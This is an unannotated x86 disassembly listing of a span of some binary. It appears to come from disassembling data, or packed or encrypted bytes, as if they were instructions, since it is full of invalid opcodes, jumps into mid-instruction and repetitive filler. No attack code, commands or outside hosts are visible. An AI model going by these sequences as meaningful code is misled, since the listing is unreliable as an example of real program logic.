  452fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  452ff0:	cmc    
  452ff1:	inc    ebx
  452ff2:	or     eax,0x77643a81
  452ff7:	sar    edi,0xff
  452ffa:	loopne 0x453000
  452ffc:	mov    eax,0xd02
  453001:	jmp    0x452fea
  453003:	mov    BYTE PTR [edx],cl
  453005:	add    BYTE PTR [esi],cl
  453007:	sar    bh,0x88
  45300a:	fmul   DWORD PTR [edi]
  45300c:	add    BYTE PTR [di+0x1],al
  453010:	add    BYTE PTR [eax+0xd],ch
  453013:	add    DWORD PTR [eax+0x0],eax
	...
  453032:	add    BYTE PTR [eax],al
  453034:	xchg   bl,dh
  453036:	arpl   dx,di
  453038:	into   
  453039:	(bad)  
  45303a:	jle    0x452ffe
  45303c:	or     eax,0xbf000001
  453041:	daa    
  453042:	cdq    
  453043:	(bad)  
  453044:	adc    bl,BYTE PTR ds:0x5819c47c
  45304a:	inc    DWORD PTR [edx]
  45304c:	dec    ebp
  45304d:	add    BYTE PTR [ebx],ch
  45304f:	add    BYTE PTR [esi],cl
  453051:	add    BYTE PTR [eax],al
  453053:	mov    eax,DWORD PTR [eax]
  453055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  453056:	cmc    
  453057:	inc    ebx
  453058:	or     eax,0x1089c7e9
  45305d:	je     0x453054
  45305f:	inc    ebx
  453060:	or     eax,0xd7941289
  453065:	sar    bh,0x51
  453068:	ins    BYTE PTR es:[edi],dx
  453069:	mov    ds:0xb00d43f5,eax
  45306e:	test   BYTE PTR [ebp-0x43],cl
  453071:	scas   al,BYTE PTR es:[edi]
  453072:	out    0x9d,eax
  453074:	mov    cl,0x1c
  453076:	clc    
  453077:	adc    ecx,0xb
  45307a:	test   DWORD PTR ds:0x3c1a29,edx
  453080:	push   cs
  453081:	mov    bl,0x7
  453083:	mov    DWORD PTR [eax],edi
  453085:	sub    BYTE PTR [ebp+edx*2-0x7422e38b],al
  45308c:	push   0x49ccbcba
  453091:	dec    ebx
  453092:	retf   
  453093:	int3   
  453094:	fmul   DWORD PTR [eax+0x8beb]
	...
  4530b6:	rol    BYTE PTR [edi],1
  4530b8:	xor    eax,0x911145
  4530bd:	mov    edx,eax
  4530bf:	pop    es
  4530c0:	in     eax,0x5
  4530c2:	data16 add BYTE PTR [ebp-0x4344e6bb],al
  4530c9:	int3   
  4530ca:	push   ecx
  4530cb:	dec    ebx
  4530cc:	retf   
  4530cd:	int3   
  4530ce:	dec    ecx
  4530cf:	dec    ebx
  4530d0:	retf   
  4530d1:	int3   
  4530d2:	fmul   DWORD PTR [eax-0x14c67c15]
  4530d8:	rol    BYTE PTR [ebp+0x21],0xff
  4530dc:	pop    ds
  4530dd:	add    al,0xd
  4530df:	mov    DWORD PTR [edx+0x8],eax
  4530e2:	test   dl,al
  4530e4:	xlat   BYTE PTR ds:[ebx]
  4530e5:	mov    ebx,DWORD PTR [eax+0x38]
  4530e8:	test   BYTE PTR [ebp+0x15],dl
  4530eb:	dec    DWORD PTR [esi+0x3c]
  4530ee:	test   BYTE PTR [ebp+0x20488bdf],dh
  4530f4:	or     BYTE PTR [edi+0x5584f455],dh
  4530fa:	in     eax,dx
  4530fb:	lea    eax,[ebx+0xa]
  4530fe:	cmc    
  4530ff:	mov    BYTE PTR [edx-0x18],al
  453102:	gs hlt 
  453104:	add    eax,DWORD PTR [eax+0xd]
  453107:	xchg   DWORD PTR [edx],ecx
  453109:	mov    edi,es
  45310b:	mov    edi,0xcba550ff
  453110:	hlt    
  453111:	push   DWORD PTR [edx-0x6bf73c81]
  453117:	(bad)
	...
  453136:	add    BYTE PTR [eax],al
  453138:	dec    ebp
  453139:	test   al,0xff
  45313b:	das    
  45313c:	or     eax,0xed006800
  453141:	add    eax,DWORD PTR [eax]
  453143:	push   0xd
  453145:	sbb    edx,DWORD PTR [edx-0x10]
  453148:	xchg   esp,eax
  453149:	(bad)
  45314c:	loopne 0x45316d
  45314e:	test   BYTE PTR [edx-0x27],al
  453151:	scas   eax,DWORD PTR es:[edi]
  453152:	test   BYTE PTR [ebp+0x15],cl
  453155:	mov    cl,0x84
  453157:	push   ebp
  453158:	imul   ebp,DWORD PTR [esi+0x1b58c1e7],0xc4983f8
  453162:	rol    DWORD PTR [ebp+0x41],0x0
  453166:	add    BYTE PTR [eax],al
  453168:	or     eax,0xd08b0627
  45316d:	adc    edi,DWORD PTR [eax+eax*8+0xc]
  453171:	mov    DWORD PTR [edx-0xc],eax
  453174:	xchg   esi,eax
  453175:	int    0xdf
  453177:	cvtps2pd xmm6,QWORD PTR [ecx+0x13c03901]
  45317e:	ins    BYTE PTR es:[edi],dx
  45317f:	pop    ecx
  453180:	xchg   ch,al
  453182:	out    0x83,eax
  453184:	test   esp,esi
  453186:	push   DWORD PTR [ebx+0x48]
  453189:	xchg   DWORD PTR [edx-0x18],ecx
  45318c:	mov    ds,WORD PTR [eax-0x2386fff1]
  453192:	test   BYTE PTR [ebp-0xb],dl
  453195:	xchg   BYTE PTR ds:0xdfcc9610,bh
  45319b:	mov    eax,DWORD PTR [eax]
	...
  4531b9:	add    BYTE PTR [esp+ebx*8],bh
  4531bc:	mov    al,BYTE PTR [ebp+edi*8+0x1a]
  4531c0:	test   BYTE PTR [ebp-0x53],cl
  4531c3:	into   
  4531c4:	int    0xf7
  4531c6:	cmp    al,0xdc
  4531c8:	test   BYTE PTR [ebp-0x53],dl
  4531cb:	or     ch,BYTE PTR [ecx-0x7b500ebe]
  4531d1:	inc    ebp
  4531d2:	mov    ch,0x86
  4531d4:	dec    edx
  4531d5:	or     BYTE PTR [esi],cl
  4531d7:	enter  0x5113,0x86
  4531db:	mov    ah,0xe7
  4531dd:	mov    ecx,DWORD PTR [eax+0x24]
  4531e0:	cld    
  4531e1:	inc    ecx
  4531e2:	sbb    DWORD PTR [eax+0x1a8055e7],esi
  4531e8:	clc    
  4531e9:	adc    DWORD PTR [ecx+0xb],0xffffff85
  4531ed:	dec    ebp
  4531ee:	gs jle 0x4531af
  4531f1:	sub    BYTE PTR [esp+ecx*8-0x79801419],dl
  4531f8:	push   edx
  4531f9:	in     al,0xbf
  4531fb:	daa    
  4531fc:	or     esp,edi
  4531fe:	push   edx
  4531ff:	sbb    bh,BYTE PTR [esp+eax*8+0x11]
  453203:	test   al,0x23
  453205:	add    al,0xcd
  453207:	call   FWORD PTR [esi-0x41c874]
  45320d:	dec    edi
  45320e:	and    eax,0x2afff586
  453213:	jle    0x4531d8
  453215:	or     BYTE PTR [esp+eax*8-0x78277c25],dl
  45321c:	cmc    
  45321d:	inc    ebx
	...
  45323a:	add    BYTE PTR [eax],al
  45323c:	or     eax,0x960a7300
  453241:	or     eax,DWORD PTR [eax+0x4f004efa]
  453247:	jmp    DWORD PTR [eax+0x3c]
  45324a:	jl     0x453289
  45324c:	test   DWORD PTR [esi],edx
  45324e:	cmp    al,0x0
  453250:	or     eax,0x4d6a1b93
  453255:	test   al,0xff
  453257:	das    
  453258:	or     eax,0xd1558500
  45325d:	scas   al,BYTE PTR es:[edi]
  45325e:	test   BYTE PTR [ebp-0x53],al
  453261:	test   DWORD PTR [edi+0x34],eax
  453264:	pop    esp
  453265:	sbb    DWORD PTR [edx-0x10],edx
  453268:	outs   dx,BYTE PTR ds:[esi]
  453269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  45326a:	cmc    
  45326b:	inc    ebx
  45326c:	or     eax,0x4d6a1225
  453271:	test   al,0xff
  453273:	das    
  453274:	or     eax,0x99558500
  453279:	scas   al,BYTE PTR es:[edi]
  45327a:	add    BYTE PTR gs:[edx-0xe5c104d],dl
  453281:	adc    eax,0xdb8e003c
  453286:	arpl   dx,di
  453288:	into   
  453289:	(bad)  
  45328a:	push   DWORD PTR [eax+ebx*1-0x5a]
  45328e:	aas    
  45328f:	push   0xffffd00d
  453294:	xchg   esi,eax
  453295:	ret    
  453296:	sti    
  453297:	push   eax
  453298:	out    0xff,eax
  45329a:	clc    
  45329b:	push   ebp
  45329c:	pop    ebp
  45329d:	pop    ebp
  45329e:	arpl   dx,di
	...
  4532bc:	add    BYTE PTR [eax],al
  4532be:	into   
  4532bf:	inc    DWORD PTR [ebp+ecx*2-0x27b578d7]
  4532c6:	xchg   BYTE PTR [ebx+0x37c88bd7],dh
  4532cc:	cld    
  4532cd:	inc    ecx
  4532ce:	jmp    0x97257559
  4532d3:	retf   
  4532d4:	fisttp WORD PTR [ebx-0x74b25044]
  4532da:	enter  0x4f23,0x8b
  4532de:	sbb    BYTE PTR [ebp+esi*8-0x1850f2bd],ah
  4532e5:	xchg   ecx,eax
  4532e6:	stc    
  4532e7:	sbb    al,bh
  4532e9:	or     ecx,0xb
  4532ec:	test   DWORD PTR [ebp-0x13],edx
  4532ef:	jl     0x4532a6
  4532f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4532f2:	or     eax,0x61000000
  4532f7:	xlat   BYTE PTR ds:[ebx]
  4532f8:	test   BYTE PTR [ebp-0x13],al
  4532fb:	test   BYTE PTR [edx-0x28],cl
  4532fe:	push   cs
  4532ff:	mov    BYTE PTR [edi-0x78fff300],bl
  453305:	dec    ebp
  453306:	test   eax,0x6ce05284
  45330b:	mov    ds:0xe50d43f5,eax
  453310:	cmp    eax,0xf5736e34
  453315:	inc    ebx
  453316:	or     eax,0x97940a85
  45331b:	mov    esp,0xf29650ff
  453320:	arpl   dx,di
	...
  45333e:	add    BYTE PTR [eax],al
  453340:	into   
  453341:	dec    DWORD PTR [ebp-0x75]
  453344:	shr    BYTE PTR [ebx],1
  453346:	dec    edi
  453347:	call   0x3d493d
  45334c:	mov    es,WORD PTR [ebx+0xb]
  45334f:	mov    edx,eax
  453351:	pop    ds
  453352:	test   BYTE PTR ds:0x3c15f1,dl
  453358:	push   cs
  453359:	scas   eax,DWORD PTR es:[edi]
  45335a:	daa    
  45335b:	mov    DWORD PTR [eax],esp
  45335d:	fs cmc 
  45335f:	inc    ebx
  453360:	or     eax,0x37883a7d
  453365:	mov    esp,0xebb8ffff
  45336a:	sahf   
  45336b:	fs daa 
  45336d:	mov    esp,0xa964fff
  453372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  453373:	cli    
  453374:	into   
  453375:	dec    DWORD PTR [esi-0x75]
  453378:	clc    
  453379:	jg     0x453370
  45337b:	inc    ebx
  45337c:	or     eax,0x175e7b2
  453381:	sbb    al,bh
  453383:	adc    ecx,0x4
  453386:	lahf   
  453387:	fs test ebx,0xbff54fff
  45338e:	idiv   bh
  453390:	loop   0x453315
  453392:	ret    
  453393:	add    al,0xe6
  453395:	mov    al,ds:0xc0093467
  45339a:	dec    DWORD PTR [edx+0x43f58418]
  4533a0:	or     eax,0x51e7b1
	...
  4533c1:	add    BYTE PTR [edi+edx*1+0x8c983f8],dh
  4533c8:	xchg   DWORD PTR [ebp-0x3f],eax
  4533cb:	mov    edx,DWORD PTR [edx]
  4533cd:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4533cf:	ret    
  4533d0:	call   DWORD PTR [ecx-0x7a]
  4533d3:	mov    ebp,0x9c008bdf
  4533d8:	cmc    
  4533d9:	inc    ebx
  4533da:	or     eax,0xdc284803
  4533df:	mov    dl,BYTE PTR [edx]
  4533e1:	xor    BYTE PTR [edi-0x3d],0xff
  4533e5:	push   ecx
  4533e6:	gs jmp 0x4533e4
  4533e9:	jmp    FWORD PTR [edx-0x7d]
  4533ec:	ret    
  4533ed:	or     al,0xac
  4533ef:	xor    ch,0x43
  4533f2:	or     eax,0xef7dffd
  4533f7:	add    BYTE PTR [ebp-0x3cb854],bl
  4533fd:	mov    eax,ss
  4533ff:	pop    ss
  453400:	dec    esi
  453401:	push   0xffffffcd
  453403:	test   eax,0x64188b01
  453408:	cmc    
  453409:	inc    ebx
  45340a:	or     eax,0x3955f8b2
  45340f:	sub    ch,bl
  453411:	sti    
  453412:	sbb    dl,BYTE PTR [edi]
  453414:	mov    bh,0x1
  453416:	or     eax,0xf08b0000
  45341b:	mov    ah,0xbd
  45341d:	add    al,0xd
  45341f:	inc    esp
  453420:	retf   
  453421:	int3   
  453422:	leave  
  453423:	inc    ebx
  453424:	retf   
  453425:	int3   
	...
  453442:	add    BYTE PTR [eax],al
  453444:	pop    eax
  453445:	mov    ebp,ebx
  453447:	mov    edx,DWORD PTR [eax+0x8]
  45344a:	test   DWORD PTR [eax-0x1f],eax
  45344d:	mov    ah,0xbc
  45344f:	int3   
  453450:	leave  
  453451:	inc    ebx
  453452:	retf   
  453453:	int3   
  453454:	cmp    BYTE PTR [ebx-0x509cac15],cl
  45345a:	test   BYTE PTR ds:0x3c1a3d,bh
  453460:	xchg   ah,dh
  453462:	jnp    0x45345e
  453464:	dec    esi
  453465:	add    BYTE PTR [ebp+0x3c1a3535],al
  45346b:	add    BYTE PTR [edx-0x4a],al
  45346e:	push   esp
  45346f:	pop    ebp
  453470:	into   
  453471:	inc    ebx
  453472:	retf   
  453473:	int3   
  453474:	cmp    BYTE PTR [ebx-0x440aae15],cl
  45347a:	add    eax,DWORD PTR [eax+0xd]
  45347d:	popa   
  45347e:	mov    edi,edx
  453480:	into   
  453481:	dec    DWORD PTR [edi-0x18]
  453484:	mov    eax,ds:0x8efff817
  453489:	cmp    eax,DWORD PTR [edi]
  45348b:	mov    eax,ecx
  45348d:	adc    eax,DWORD PTR [ebp+ecx*2+0x65b105]
  453494:	xchg   ah,ch
  453496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  453497:	cli    
  453498:	into   
  453499:	dec    DWORD PTR [ebp-0x1]
  45349c:	fcom   DWORD PTR [ebx]
  45349e:	test   ch,ah
  4534a0:	fadd   DWORD PTR [edx-0x35]
  4534a3:	int3   
  4534a4:	fmul   DWORD PTR [edx+0x83eb]
	...
  4534c6:	cmp    ebx,ebx
  4534c8:	rol    BYTE PTR [ebp+0x25],0xff
  4534cc:	(bad)  
  4534cd:	dec    DWORD PTR ds:0x95dc423f
  4534d3:	(bad)  
  4534d4:	(bad)  
  4534d5:	call   edx
  4534d7:	mov    ebx,0xd01f3
  4534dc:	add    bh,al
  4534de:	push   eax
  4534df:	adc    al,0xff
  4534e1:	dec    DWORD PTR ds:0xf145c100
  4534e7:	add    BYTE PTR [eax],al
  4534e9:	add    BYTE PTR ds:0x84084a89,cl
  4534ef:	add    eax,DWORD PTR [eax-0x17ffb106]
  4534f5:	test   eax,0xa1f815c2
  4534fa:	lea    ebx,[edx]
  4534fc:	cmp    al,0x0
  4534fe:	lock adc al,0xf8
  453501:	add    BYTE PTR ds:0x10c70b8c,cl
  453507:	mov    ch,dh
  453509:	inc    ebx
  45350a:	or     eax,0xd000000
  45350f:	sub    DWORD PTR ds:0xf58808c7,eax
  453515:	inc    ebx
  453516:	or     eax,0xdffffff
  45351b:	cmp    DWORD PTR [edx],0xffc17780
  453521:	(bad)  
  453522:	clc    
  453523:	or     ecx,eax
  453525:	add    eax,0x3c1a95
	...
  453546:	add    BYTE PTR [eax],al
  453548:	or     eax,0x8e000000
  45354d:	rol    DWORD PTR [edi-0x3106],cl
  453553:	je     0x45356d
  453555:	stos   BYTE PTR es:[edi],al
  453556:	(bad)  
  453557:	(bad)  
  453558:	sbb    BYTE PTR [eax+0x610d43f5],dh
  45355e:	jg     0x45355a
  453560:	into   
  453561:	inc    DWORD PTR [ebp+ecx*1+0x3c1a8d]
  453568:	xchg   esp,eax
  453569:	ret    
  45356a:	out    0x8b,eax
  45356c:	add    BYTE PTR [eax-0x76f2bc0b],al
  453572:	inc    edx
  453573:	call   0x8980f786
  453578:	dec    eax
  453579:	sub    BYTE PTR [ebp+ecx*2+0x6c0a86e5],al
  453580:	test   eax,0xfc3d67ff
  453586:	aas    
  453587:	add    dl,ah
  453589:	jmp    0x8c9d:0x4efa4f
  453590:	xlat   BYTE PTR ds:[ebx]
  453591:	sar    bh,0xc6
  453594:	adc    BYTE PTR [ebp+esi*8+0x43],dh
  453598:	or     eax,0xd40038b
  45359d:	test   al,0x5f
  45359f:	add    al,0x4d
  4535a1:	add    BYTE PTR [ebp+0x3c199915],al
  4535a7:	add    BYTE PTR [edi],bh
  4535a9:	sub    BYTE PTR [ebp+0xf7],bh
	...
  4535c7:	add    BYTE PTR [eax],al
  4535c9:	add    BYTE PTR [edx+0x5c47c14],bl
  4535cf:	popa   
  4535d0:	xchg   edi,eax
  4535d1:	cli    
  4535d2:	into   
  4535d3:	(bad)  
  4535d4:	clc    
  4535d5:	adc    eax,0x3c19a5
  4535da:	scas   al,BYTE PTR es:[edi]
  4535db:	addr16 cmc 
  4535dd:	inc    ebx
  4535de:	or     eax,0xcefa9b5f
  4535e3:	dec    DWORD PTR [edi-0x18]
  4535e6:	cdq    
  4535e7:	adc    eax,0x3b8efff8
  4535ec:	add    ecx,DWORD PTR [ecx+0x4d840fc8]
  4535f2:	cmp    eax,0x43d5e7ae
  4535f7:	adc    al,0xf8
  4535f9:	adc    DWORD PTR [ecx-0x5],0xffffff9c
  4535fd:	test   BYTE PTR [edi],dh
  4535ff:	sar    bh,0x8a
  453602:	ror    BYTE PTR [edi],0x4d
  453605:	push   0xd
  453607:	pop    edi
  453608:	cmp    edx,0xffffffce
  45360b:	dec    DWORD PTR [edi-0x18]
  45360e:	jno    0x45361c
  453610:	clc    
  453611:	dec    DWORD PTR [esi+0x508b0b3c]
  453617:	adc    BYTE PTR [esi+0x5287ed4d],al
  45361d:	cld    
  45361e:	lods   eax,DWORD PTR ss:[esi]
  453620:	out    dx,eax
  453621:	jae    0x45366a
  453623:	xchg   DWORD PTR [edx-0x20],eax
  453626:	cmp    eax,0x3cdc4a87
  45362b:	sub    BYTE PTR [ecx+0xfb],ch
	...
  453649:	add    BYTE PTR [eax],al
  45364b:	add    dl,dl
  45364d:	adc    edi,DWORD PTR [esp+eax*8+0x15]
  453651:	pop    edi
  453652:	(bad)  
  453653:	cli    
  453654:	dec    esi
  453655:	add    BYTE PTR [ebp+0x3c169d15],al
  45365b:	add    BYTE PTR [edi+0x61],bl
  45365e:	fwait
  45365f:	cli    
  453660:	dec    esi
  453661:	add    ch,bh
  453663:	inc    esp
  453664:	test   eax,0x910d84b0
  453669:	push   ss
  45366a:	cmp    al,0x0
  45366c:	push   cs
  45366d:	vsqrtsd xmm6,xmm0,QWORD PTR [ebp+0x2b]
  453672:	idiv   bh
  453674:	cmp    BYTE PTR [edi-0x3d],0xc
  453678:	xchg   BYTE PTR [ebp+0x33d803f3],ch
  45367e:	cld    
  45367f:	push   esp
  453680:	jno    0x45360b
  453682:	push   edx
  453683:	in     al,0x96
  453685:	mov    ebp,0x33d003fb
  45368a:	xchg   BYTE PTR [ebp+0x51],al
  45368d:	xchg   DWORD PTR [edx-0x20],ecx
  453690:	test   BYTE PTR [eax+edx*4],0xfa
  453694:	into   
  453695:	inc    DWORD PTR [esi-0x66d8d2b3]
  45369b:	(bad)  
  45369c:	enter  0xff17,0xff
  4536a0:	or     eax,0x9609e500
  4536a5:	lods   eax,DWORD PTR ds:[esi]
  4536a6:	test   DWORD PTR [ebx+0x5586fc4f],0xf8428715
	...
  4536cc:	add    BYTE PTR [eax],al
  4536ce:	inc    esi
  4536cf:	mov    ebp,0x874573ef
  4536d4:	or     al,BYTE PTR [edi+esi*8+0x4002ffbe]
  4536db:	sbb    BYTE PTR [ecx+edx*1-0x5e0852f2],al
  4536e2:	mov    DWORD PTR ds:0xbd0e003c,edx
  4536e8:	test   DWORD PTR [ecx-0x7b57903],0x3e6408c
  4536f2:	or     eax,0x91158500
  4536f7:	adc    eax,0xad0e003c
  4536fc:	div    DWORD PTR [ebx]
  4536fe:	pop    ss
  4536ff:	popa   
  453700:	cmp    edx,0x4e
  453703:	add    ch,bh
  453705:	inc    esp
  453706:	xchg   ebp,eax
  453707:	mov    BYTE PTR [edi],al
  453709:	jmp    0x453765
  45370b:	mov    BYTE PTR [edx],ch
  45370d:	je     0x453696
  45370f:	mov    esi,0x904088ff
  453714:	cmc    
  453715:	inc    ebx
  453716:	or     eax,0x3889c6cf
  45371b:	test   al,0xf5
  45371d:	inc    ebx
  45371e:	or     eax,0x89c6cf
  453723:	xchg   esp,eax
  453724:	cmc    
  453725:	inc    ebx
  453726:	or     eax,0x52f74928
  45372b:	adc    cl,BYTE PTR [edx+0x3c184a0d]
	...
  45374d:	add    BYTE PTR [eax],al
  45374f:	add    BYTE PTR [esp+eax*8-0xf24609],dl
  453756:	aas    
  453757:	add    BYTE PTR [eax+ebp*1+0xd02ff],cl
  45375e:	test   DWORD PTR [ebp+0x25],edx
  453761:	out    0xce,al
  453763:	mov    DWORD PTR [eax],eax
  453765:	cwde   
  453766:	cmc    
  453767:	inc    ebx
  453768:	or     eax,0x4efa7761
  45376d:	add    BYTE PTR [eax-0x18],dl
  453770:	or     DWORD PTR [esi],edx
  453772:	clc    
  453773:	dec    DWORD PTR [esi+0x8b033c]
  453779:	jl     0x453770
  45377b:	inc    ebx
  45377c:	or     eax,0xe7d5e7af
  453781:	adc    eax,edi
  453783:	test   ebp,ecx
  453785:	mov    eax,DWORD PTR [ebx]
  453787:	xor    ecx,ebp
  453789:	and    eax,0x8bf08b25
  45378e:	cmc    
  45378f:	inc    ebx
  453790:	or     eax,0x8e04c37d
  453795:	rol    DWORD PTR [edi+0x4efa],cl
  45379b:	je     0x4537b1
  45379d:	pop    edi
  45379e:	arpl   dx,di
  4537a0:	dec    esi
  4537a1:	add    BYTE PTR [edi-0x18040ebc],al
  4537a7:	pop    ebp
  4537a8:	nop
  4537a9:	adc    eax,edi
  4537ab:	mov    esp,DWORD PTR [eax]
  4537ad:	pop    esp
  4537ae:	cmc    
  4537af:	inc    ebx
  4537b0:	or     eax,0x33bcae
	...
  4537d1:	add    BYTE PTR [ebp-0x7b],cl
  4537d4:	loop   0x453833
  4537d6:	dec    esi
  4537d7:	inc    esp
  4537d8:	retf   
  4537d9:	int3   
  4537da:	or     eax,0xd000000
  4537df:	add    BYTE PTR [eax],al
  4537e1:	add    BYTE PTR ds:0xd000000,cl
  4537e7:	add    BYTE PTR [eax],al
  4537e9:	add    BYTE PTR ds:0xd000000,cl
  4537ef:	add    BYTE PTR [eax],al
  4537f1:	add    BYTE PTR ds:0xd000000,cl
  4537f7:	add    BYTE PTR [eax],al
  4537f9:	add    BYTE PTR ds:0xd000000,cl
  4537ff:	add    BYTE PTR [eax],al
  453801:	add    BYTE PTR ds:0xd000000,cl
  453807:	add    BYTE PTR [eax],al
  453809:	add    BYTE PTR ds:0xd000000,cl
  45380f:	add    BYTE PTR [eax],al
  453811:	add    BYTE PTR ds:0xd000000,cl
  453817:	add    BYTE PTR [eax],al
  453819:	add    BYTE PTR ds:0xd000000,cl
  45381f:	add    BYTE PTR [eax],al
  453821:	add    BYTE PTR ds:0xd000000,cl
  453827:	add    BYTE PTR [eax],al
  453829:	add    BYTE PTR ds:0xd000000,cl
  45382f:	add    BYTE PTR [eax],al
  453831:	add    BYTE PTR ds:0x0,cl
	...
  453853:	add    BYTE PTR ds:0xd000000,cl
  453859:	add    BYTE PTR [eax],al
  45385b:	add    BYTE PTR ds:0xd000000,cl
  453861:	add    BYTE PTR [eax],al
  453863:	add    BYTE PTR ds:0xd000000,cl
  453869:	add    BYTE PTR [eax],al
  45386b:	add    BYTE PTR ds:0xd000000,cl
  453871:	add    BYTE PTR [eax],al
  453873:	add    BYTE PTR ds:0xd000000,cl
  453879:	add    BYTE PTR [eax],al
  45387b:	add    BYTE PTR ds:0xd000000,cl
  453881:	add    BYTE PTR [eax],al
  453883:	add    BYTE PTR ds:0xd000000,cl
  453889:	add    BYTE PTR [eax],al
  45388b:	add    BYTE PTR ds:0xd000000,cl
  453891:	add    BYTE PTR [eax],al
  453893:	add    BYTE PTR ds:0xd000000,cl
  453899:	add    BYTE PTR [eax],al
  45389b:	add    BYTE PTR ds:0xd000000,cl
  4538a1:	add    BYTE PTR [eax],al
  4538a3:	add    BYTE PTR ds:0xd000000,cl
  4538a9:	add    BYTE PTR [eax],al
  4538ab:	add    BYTE PTR ds:0xd000000,cl
  4538b1:	add    BYTE PTR [eax],al
  4538b3:	add    BYTE PTR [eax],al
  4538b5:	add    al,0x0
  4538b7:	add    BYTE PTR ds:0x5000000,cl
  4538bd:	add    BYTE PTR [eax],al
  4538bf:	add    BYTE PTR [ecx-0x7ecc6fcd],dl
  4538c5:	xor    ebx,DWORD PTR [eax-0x5fcc8ecd]
  4538cb:	xor    esi,DWORD PTR [ecx+0x33]
  4538ce:	test   al,0x33
  4538d0:	or     eax,0x150003e0
  4538d5:	add    BYTE PTR [eax],al
  4538d7:	add    BYTE PTR [esi],bh
  4538d9:	aas    
  4538da:	fstp   TBYTE PTR [edi]
  4538dc:	lods   eax,DWORD PTR ds:[esi]
  4538dd:	aas    
  4538de:	jmp    0x9b3f:0xf83fb23f
  4538e5:	aas    
  4538e6:	add    BYTE PTR [eax],al
  4538e8:	or     eax,0x790003f0
  4538ed:	add    BYTE PTR [eax],al
  4538ef:	add    BYTE PTR [esi],ch
  4538f1:	xor    BYTE PTR [esi],ch
  4538f3:	xor    BYTE PTR ds:0xf0305430,dh
  4538f9:	das    
  4538fa:	fwait
  4538fb:	xor    BYTE PTR [eax+esi*1+0x313030a9],ch
  453902:	xor    al,0x32
  453904:	add    dh,BYTE PTR [ebx]
  453906:	sbb    eax,0x54332833
  45390b:	xor    ebp,eax
  45390d:	xor    dh,BYTE PTR [edi+0x33]
  453910:	adc    esi,DWORD PTR [ebx+edx*1]
  453913:	xor    al,0xe6
  453915:	xor    edi,DWORD PTR [ecx]
  453917:	xor    al,0xf2
  453919:	xor    ecx,DWORD PTR [edi+0x34]
	...
  453938:	add    BYTE PTR [eax],al
  45393a:	leave  
  45393b:	xor    esp,DWORD PTR [edx+0x34]
  45393e:	fwait
  45393f:	xor    eax,DWORD PTR [ecx-0x70cb7bcc]
  453945:	xor    al,0x78
  453947:	xor    al,0xa8
  453949:	xor    al,0x1c
  45394b:	xor    eax,0x34db3517
  453950:	(bad)  ds:0x35f634e8
  453956:	or     eax,0x21361d36
  45395b:	cmp    dh,BYTE PTR ss:[esi]
  45395e:	aas    
  45395f:	ss jne 0x453998
  453962:	lods   al,BYTE PTR ds:[esi]
  453963:	xor    eax,0x35a236a9
  453968:	mov    dh,0x36
  45396a:	fnstenv ds:0x35e636d5
  453970:	jecxz  0x4539a8
  453972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  453973:	xor    eax,0x35b236f1
  453978:	getsec 
  45397a:	add    BYTE PTR [edi],dh
  45397c:	daa    
  45397d:	aaa    
  45397e:	fdiv   QWORD PTR [esi]
  453980:	cmp    esi,DWORD PTR [edi]
  453982:	inc    esp
  453983:	aaa    
  453984:	push   ebx
  453985:	aaa    
  453986:	sub    al,0x37
  453988:	cwde   
  453989:	aaa    
  45398a:	stos   DWORD PTR es:[edi],eax
  45398b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  45398d:	aaa    
  45398e:	mov    eax,0x5f37ba36
  453993:	ss push cs
  453995:	cmp    BYTE PTR ds:0x1c382538,dl
  45399b:	cmp    BYTE PTR [ebx],bh
  45399d:	cmp    BYTE PTR [eax],al
	...
  4539bb:	add    cl,cl
  4539bd:	aaa    
  4539be:	dec    esi
  4539bf:	cmp    BYTE PTR [edi+esi*1+0x37e9385e],dh
  4539c6:	ins    DWORD PTR es:[edi],dx
  4539c7:	cmp    dl,cl
  4539c9:	aaa    
  4539ca:	test   BYTE PTR [eax],bh
  4539cc:	xchg   edi,eax
  4539cd:	aaa    
  4539ce:	(bad)  
  4539cf:	cmp    BYTE PTR [eax-0x6cc766c9],ah
  4539d5:	aaa    
  4539d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4539d7:	cmp    BYTE PTR [edi+0x37],bl
  4539da:	mov    eax,0xc2376038
  4539df:	cmp    BYTE PTR [edx],bh
  4539e1:	aaa    
  4539e2:	jmp    0x2f39:0x1c38fb38
  4539e9:	aaa    
  4539ea:	sub    al,0x39
  4539ec:	pop    ebx
  4539ed:	aaa    
  4539ee:	jnp    0x453a29
  4539f0:	test   DWORD PTR [edi],esi
  4539f2:	pushf  
  4539f3:	cmp    DWORD PTR [ebx-0x5bc64cc9],ebp
  4539f9:	aaa    
  4539fa:	sar    DWORD PTR [ecx],0xd4
  4539fd:	aaa    
  4539fe:	aam    0x39
  453a00:	mov    ecx,0xdf39ed37
  453a05:	aaa    
  453a06:	add    DWORD PTR [edx],edi
  453a08:	and    BYTE PTR [edx],bh
  453a0a:	push   ds
  453a0b:	cmp    ch,bl
  453a0d:	cmp    DWORD PTR ds:0xd3a,esi
  453a13:	add    BYTE PTR ds:0xd000000,cl
  453a19:	add    BYTE PTR [eax],al
  453a1b:	add    BYTE PTR ds:0x0,cl
	...
  453a3d:	add    BYTE PTR ds:0xd000000,cl
  453a43:	add    BYTE PTR [eax],al
  453a45:	add    BYTE PTR ds:0xd000000,cl
  453a4b:	add    BYTE PTR [eax],al
  453a4d:	add    BYTE PTR ds:0xd000000,cl
  453a53:	add    BYTE PTR [eax],al
  453a55:	add    BYTE PTR ds:0xd000000,cl
  453a5b:	add    BYTE PTR [eax],al
  453a5d:	add    BYTE PTR ds:0xd000000,cl
  453a63:	add    BYTE PTR [eax],al
  453a65:	add    BYTE PTR ds:0xd000000,cl
  453a6b:	add    BYTE PTR [eax],al
  453a6d:	add    BYTE PTR ds:0xd000000,cl
  453a73:	add    BYTE PTR [eax],al
  453a75:	add    BYTE PTR ds:0xd000000,cl
  453a7b:	add    BYTE PTR [eax],al
  453a7d:	add    BYTE PTR ds:0xd000000,cl
  453a83:	add    BYTE PTR [eax],al
